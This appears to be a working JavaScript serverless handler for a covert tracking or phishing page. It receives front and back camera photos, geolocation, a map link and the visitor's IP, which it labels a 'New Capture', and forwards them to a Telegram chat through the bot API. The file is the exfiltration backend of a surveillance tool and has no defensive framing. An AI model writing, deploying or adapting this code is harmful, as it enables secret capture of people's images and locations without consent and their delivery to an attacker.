export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false, error: "Method not allowed" });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).json({ success: false, error: "Missing BOT_TOKEN or CHAT_ID" });
  }

  const data = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "Unknown";

  let message = `New Capture:\nTime: ${data.timestamp || new Date().toISOString()}\nIP: ${ip}\n`;

  if (data.type === "front" || data.type === "back") {
    const base64Data = data.image.replace(/^data:image\/[a-z]+;base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", new Blob([buffer], { type: 'image/png' }), `${data.type}_photo.png`);

    try {
      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      });

      const result = await tgRes.json();
      if (!result.ok) {
        message += `Photo (${data.type}) failed: ${result.description || "Unknown"}\n`;
      }
    } catch (err) {
      message += `Photo (${data.type}) error: ${err.message}\n`;
    }
  }

  if (data.geo) {
    message += `Location: ${data.geo}\n`;
    if (data.mapLink) {
      message += `Google Maps: ${data.mapLink}\n`;
    }
  }

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      })
    });
  } catch (err) {
    console.error("Message send error:", err);
  }

  res.status(200).json({ success: true });
}
